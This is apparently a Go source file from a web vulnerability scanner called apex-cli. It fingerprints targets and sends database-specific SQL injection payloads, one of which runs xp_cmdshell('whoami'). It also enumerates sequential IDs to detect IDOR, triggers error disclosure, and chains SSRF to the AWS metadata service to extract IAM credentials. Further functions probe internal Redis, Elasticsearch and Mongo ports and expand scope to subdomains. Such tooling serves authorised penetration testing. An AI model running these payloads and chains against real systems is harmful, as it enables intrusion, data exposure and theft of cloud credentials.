package scanner

import (
	"crypto/md5"
	"encoding/json"
	"fmt"
	"math"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

// --- Response Fingerprinting Engine ---
// Learns what "normal" looks like per endpoint, then detects anomalies

type ResponseFingerprint struct {
	StatusCode int
	BodyHash   string
	BodySize   int
	Headers    map[string]string
	WordCount  int
	LineCount  int
}

func fingerprint(resp *engine.Response) ResponseFingerprint {
	if resp == nil || resp.Err != nil {
		return ResponseFingerprint{}
	}
	h := md5.Sum([]byte(resp.Body))
	return ResponseFingerprint{
		StatusCode: resp.StatusCode,
		BodyHash:   fmt.Sprintf("%x", h),
		BodySize:   len(resp.Body),
		Headers:    flatHeaders(resp.Headers),
		WordCount:  len(strings.Fields(resp.Body)),
		LineCount:  strings.Count(resp.Body, "\n"),
	}
}

func flatHeaders(h map[string][]string) map[string]string {
	flat := make(map[string]string)
	for k, v := range h {
		if len(v) > 0 {
			flat[k] = v[0]
		}
	}
	return flat
}

func (a ResponseFingerprint) DiffersFrom(b ResponseFingerprint) bool {
	if a.StatusCode != b.StatusCode {
		return true
	}
	if a.BodyHash != b.BodyHash {
		sizeDiff := math.Abs(float64(a.BodySize - b.BodySize))
		// Ignore tiny differences (dynamic tokens, timestamps)
		if sizeDiff > 50 || float64(sizeDiff)/float64(max(a.BodySize, 1)) > 0.1 {
			return true
		}
	}
	return false
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

// --- Technology-Adaptive Payload Selection ---
// Detects backend tech and only sends relevant payloads

type TechStack struct {
	Language  string // php, java, python, node, ruby, dotnet
	Framework string // laravel, spring, django, express, rails, asp
	Database  string // mysql, postgres, mssql, mongodb, sqlite
	Server    string // nginx, apache, iis, cloudflare
}

func DetectTech(http *engine.HTTPClient, target string) TechStack {
	tech := TechStack{}
	resp := http.Get(target)
	if resp.Err != nil {
		return tech
	}

	body := strings.ToLower(resp.Body)
	headers := strings.ToLower(fmt.Sprintf("%v", resp.Headers))

	// Server
	if strings.Contains(headers, "nginx") {
		tech.Server = "nginx"
	} else if strings.Contains(headers, "apache") {
		tech.Server = "apache"
	} else if strings.Contains(headers, "iis") || strings.Contains(headers, "asp.net") {
		tech.Server = "iis"
	}

	// Language/Framework
	if strings.Contains(headers, "x-powered-by: php") || strings.Contains(body, ".php") {
		tech.Language = "php"
		if strings.Contains(headers, "laravel") || strings.Contains(body, "laravel") {
			tech.Framework = "laravel"
		}
	} else if strings.Contains(headers, "x-powered-by: express") || strings.Contains(body, "node") {
		tech.Language = "node"
		tech.Framework = "express"
	} else if strings.Contains(body, "__next") || strings.Contains(body, "_next/static") {
		tech.Language = "node"
		tech.Framework = "nextjs"
	} else if strings.Contains(headers, "x-powered-by: asp") || strings.Contains(headers, "asp.net") {
		tech.Language = "dotnet"
		tech.Framework = "asp"
	} else if strings.Contains(body, "csrfmiddlewaretoken") || strings.Contains(headers, "wsgi") {
		tech.Language = "python"
		tech.Framework = "django"
	} else if strings.Contains(headers, "x-runtime") || strings.Contains(body, "rails") {
		tech.Language = "ruby"
		tech.Framework = "rails"
	} else if strings.Contains(body, "spring") || strings.Contains(headers, "x-application-context") {
		tech.Language = "java"
		tech.Framework = "spring"
	}

	// Database hints
	if strings.Contains(body, "mysql") || strings.Contains(body, "mysqli") {
		tech.Database = "mysql"
	} else if strings.Contains(body, "pgsql") || strings.Contains(body, "postgres") {
		tech.Database = "postgres"
	} else if strings.Contains(body, "mssql") || strings.Contains(body, "sqlserver") {
		tech.Database = "mssql"
	} else if strings.Contains(body, "mongo") {
		tech.Database = "mongodb"
	}

	return tech
}

func GetSQLiPayloadsForTech(tech TechStack) []struct{ payload, detect string } {
	base := []struct{ payload, detect string }{
		{"'", "error|syntax|unexpected"},
		{"' OR '1'='1", ""},
		{"' AND '1'='2", ""},
	}
	switch tech.Database {
	case "mysql":
		base = append(base,
			struct{ payload, detect string }{"' AND SLEEP(3)--", ""},
			struct{ payload, detect string }{"' AND extractvalue(1,concat(0x7e,version()))--", "xpath"},
			struct{ payload, detect string }{"' UNION SELECT @@version,NULL--", "mariadb|mysql|5."},
		)
	case "postgres":
		base = append(base,
			struct{ payload, detect string }{"' AND pg_sleep(3)--", ""},
			struct{ payload, detect string }{"' AND 1=CAST(version() AS int)--", "postgresql"},
			struct{ payload, detect string }{"'; SELECT pg_sleep(3)--", ""},
		)
	case "mssql":
		base = append(base,
			struct{ payload, detect string }{"'; WAITFOR DELAY '0:0:3'--", ""},
			struct{ payload, detect string }{"' AND 1=CONVERT(int,@@version)--", "microsoft|sql server"},
			struct{ payload, detect string }{"'; EXEC xp_cmdshell('whoami')--", ""},
		)
	case "mongodb":
		base = append(base,
			struct{ payload, detect string }{`{"$gt":""}`, ""},
			struct{ payload, detect string }{`{"$ne":"x"}`, ""},
			struct{ payload, detect string }{`[$ne]=1`, ""},
		)
	default:
		// Generic — try all
		base = append(base,
			struct{ payload, detect string }{"' AND SLEEP(3)--", ""},
			struct{ payload, detect string }{"'; WAITFOR DELAY '0:0:3'--", ""},
			struct{ payload, detect string }{"' || pg_sleep(3)--", ""},
		)
	}
	return base
}

// --- Recursive Parameter Value Discovery ---
// When a param is found, try to enumerate its valid values

func scanParamValueEnum(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	idParams := []string{"id", "user_id", "uid", "account", "order_id", "item_id", "doc_id", "page_id"}

	for u, params := range crawl.Params {
		for _, p := range params {
			pLower := strings.ToLower(p)
			isIDParam := false
			for _, ip := range idParams {
				if pLower == ip || strings.HasSuffix(pLower, "_id") || pLower == "id" {
					isIDParam = true
					break
				}
			}
			if !isIDParam {
				continue
			}

			wg.Add(1)
			go func(baseURL, param string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				// Try sequential IDs to find IDOR
				var responses []struct {
					id   string
					size int
					hash string
				}
				for i := 1; i <= 10; i++ {
					testURL := injectParam(baseURL, param, fmt.Sprintf("%d", i))
					resp := http.Get(testURL)
					if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 50 {
						h := md5.Sum([]byte(resp.Body))
						responses = append(responses, struct {
							id   string
							size int
							hash string
						}{fmt.Sprintf("%d", i), len(resp.Body), fmt.Sprintf("%x", h)})
					}
				}

				// If multiple different responses = IDOR
				if len(responses) >= 2 {
					uniqueHashes := make(map[string]bool)
					for _, r := range responses {
						uniqueHashes[r.hash] = true
					}
					if len(uniqueHashes) > 1 {
						mu.Lock()
						findings = append(findings, Finding{
							Type: "IDOR — Sequential ID Enumeration", Severity: "high",
							URL: baseURL, Param: param,
							Detail:   fmt.Sprintf("IDs 1-%d return %d different responses — user data accessible via ID manipulation", len(responses), len(uniqueHashes)),
							Template: "apex-idor-enum",
						})
						mu.Unlock()
					}
				}
			}(u, p)
		}
	}
	wg.Wait()
	return findings
}

// --- Error Pattern Learning ---
// Collects error messages and uses them to identify injection points

var errorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)(?:sql|mysql|postgres|oracle|sqlite|mssql).*(?:error|syntax|unexpected|unterminated)`),
	regexp.MustCompile(`(?i)(?:fatal|exception|stack ?trace|traceback|at line \d+)`),
	regexp.MustCompile(`(?i)(?:undefined (?:variable|index|property|method)|cannot read property)`),
	regexp.MustCompile(`(?i)(?:java\.\w+Exception|\.java:\d+|at \w+\.\w+\()`),
	regexp.MustCompile(`(?i)(?:Warning:.*\bon line\b|Parse error|Fatal error)`),
	regexp.MustCompile(`(?i)(?:TypeError|ReferenceError|SyntaxError|RangeError):`),
	regexp.MustCompile(`(?i)(?:Internal Server Error|500|Application Error)`),
	regexp.MustCompile(`(?i)(?:ODBC|OLE DB|Microsoft Access|JET Database)`),
	regexp.MustCompile(`(?i)(?:pg_query|pg_exec|PG::)`),
	regexp.MustCompile(`(?i)(?:MongoError|MongoDB|BSON)`),
}

func scanErrorHarvest(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	// Trigger errors with malformed input
	errorTriggers := []string{"'", "\"", "\\", "%00", "[]", "{}", "{{", "${", "<>", "NaN", "undefined", "-1", "99999999999", "' OR '", "../"}

	for u, params := range crawl.Params {
		for _, p := range params {
			wg.Add(1)
			go func(baseURL, param string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				for _, trigger := range errorTriggers {
					testURL := injectParam(baseURL, param, trigger)
					resp := http.Get(testURL)
					if resp.Err != nil || resp.StatusCode < 400 {
						continue
					}

					for _, pattern := range errorPatterns {
						if pattern.MatchString(resp.Body) {
							match := pattern.FindString(resp.Body)
							mu.Lock()
							findings = append(findings, Finding{
								Type: "Error Disclosure — Injection Point", Severity: "medium",
								URL: testURL, Param: param, Payload: trigger,
								Detail:   fmt.Sprintf("Error triggered: %s", match[:min(100, len(match))]),
								Template: "apex-error-disclosure",
							})
							mu.Unlock()
							return // One error per param is enough
						}
					}
				}
			}(u, p)
		}
	}
	wg.Wait()
	return findings
}

// --- Chained Exploitation ---
// If SSRF found, automatically try to escalate to cloud creds
// If open redirect found, chain with OAuth for token theft

func scanExploitChains(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding

	// Check if we already found SSRF-able params from other scanners
	ssrfParams := []string{"url", "uri", "src", "fetch", "proxy", "dest", "redirect", "link"}
	for u, params := range crawl.Params {
		for _, p := range params {
			if !containsAnyStr(strings.ToLower(p), ssrfParams) {
				continue
			}

			// Chain 1: SSRF → AWS credentials
			awsChain := []string{
				"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
				"http://169.254.169.254/latest/user-data",
			}
			for _, target := range awsChain {
				testURL := injectParam(u, p, target)
				resp := http.Get(testURL)
				if resp.Err == nil && resp.StatusCode == 200 {
					if strings.Contains(resp.Body, "AccessKeyId") || strings.Contains(resp.Body, "SecretAccessKey") {
						findings = append(findings, Finding{
							Type: "Exploit Chain: SSRF → AWS Credential Theft", Severity: "critical",
							URL: testURL, Param: p,
							Detail:   "SSRF escalated to AWS IAM credential extraction — full cloud compromise",
							Template: "apex-chain-ssrf-aws",
						})
						// Try to use the creds
						var creds map[string]string
						json.Unmarshal([]byte(resp.Body), &creds)
						if creds["AccessKeyId"] != "" {
							findings = append(findings, Finding{
								Type: "AWS Credentials Extracted", Severity: "critical",
								URL: testURL, Evidence: "AccessKeyId: " + creds["AccessKeyId"][:min(10, len(creds["AccessKeyId"]))] + "...",
								Detail: "Live AWS credentials obtained via SSRF chain",
								Template: "apex-aws-creds",
							})
						}
					}
				}
			}

			// Chain 2: SSRF → Internal service discovery
			internalTargets := []string{
				"http://127.0.0.1:8080/", "http://127.0.0.1:3000/",
				"http://127.0.0.1:9200/", "http://127.0.0.1:6379/",
				"http://127.0.0.1:27017/", "http://127.0.0.1:11211/stats",
			}
			for _, internal := range internalTargets {
				testURL := injectParam(u, p, internal)
				resp := http.Get(testURL)
				if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 20 {
					findings = append(findings, Finding{
						Type: "Exploit Chain: SSRF → Internal Service Access", Severity: "high",
						URL: testURL, Param: p,
						Detail: fmt.Sprintf("Internal service at %s accessible via SSRF (%d bytes)", internal, len(resp.Body)),
						Template: "apex-chain-ssrf-internal",
					})
				}
			}
		}
	}
	return findings
}

// --- Smart Scope Expansion ---
// Discovers related assets that might be in scope

func scanScopeExpansion(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	// Find related domains from page content
	domainRe := regexp.MustCompile(`(?:https?://|//)([\w\-]+\.` + regexp.QuoteMeta(cfg.Target) + `)`)
	relatedDomains := make(map[string]bool)

	for _, page := range crawl.Pages {
		resp := http.Get(page.URL)
		if resp.Err != nil {
			continue
		}
		matches := domainRe.FindAllStringSubmatch(resp.Body, -1)
		for _, m := range matches {
			if len(m) > 1 {
				relatedDomains[m[1]] = true
			}
		}
	}

	// Also check common API subdomains
	apiPrefixes := []string{"api", "api-v2", "api-internal", "graphql", "ws", "cdn", "static", "assets", "media", "uploads", "storage"}
	for _, prefix := range apiPrefixes {
		relatedDomains[prefix+"."+cfg.Target] = true
	}

	for domain := range relatedDomains {
		wg.Add(1)
		go func(d string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			resp := http.Get("https://" + d)
			if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 100 {
				mu.Lock()
				findings = append(findings, Finding{
					Type: "Scope Expansion: " + d, Severity: "info",
					URL: "https://" + d, Detail: fmt.Sprintf("Related asset discovered (%d bytes, status %d)", resp.Size, resp.StatusCode),
					Template: "apex-scope-expansion",
				})
				mu.Unlock()
			}
		}(domain)
	}
	wg.Wait()
	return findings
}

// --- Response Anomaly Detection ---
// Compares responses across params to find ones that behave differently

func scanAnomalyDetection(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding

	for u, params := range crawl.Params {
		if len(params) < 2 {
			continue
		}

		// Get baseline for each param with normal value
		type paramResponse struct {
			param string
			fp    ResponseFingerprint
		}
		var responses []paramResponse

		baseResp := http.Get(u)
		if baseResp.Err != nil {
			continue
		}
		baseFP := fingerprint(baseResp)

		for _, p := range params {
			testURL := injectParam(u, p, "1")
			resp := http.Get(testURL)
			if resp.Err == nil {
				responses = append(responses, paramResponse{p, fingerprint(resp)})
			}
		}

		// Find params whose response differs most from baseline
		sort.Slice(responses, func(i, j int) bool {
			diffI := abs(responses[i].fp.BodySize - baseFP.BodySize)
			diffJ := abs(responses[j].fp.BodySize - baseFP.BodySize)
			return diffI > diffJ
		})

		// Top anomalous params are likely interesting (database-backed, dynamic)
		for _, r := range responses[:min(3, len(responses))] {
			if r.fp.DiffersFrom(baseFP) {
				findings = append(findings, Finding{
					Type: "Anomalous Parameter: " + r.param, Severity: "info",
					URL: u, Param: r.param,
					Detail:   fmt.Sprintf("Param '%s' causes %d byte response change — likely database-backed (priority injection target)", r.param, abs(r.fp.BodySize-baseFP.BodySize)),
					Template: "apex-anomaly",
				})
			}
		}
	}
	return findings
}

var _ = time.Second // ensure import
var _ = url.Parse   // ensure import
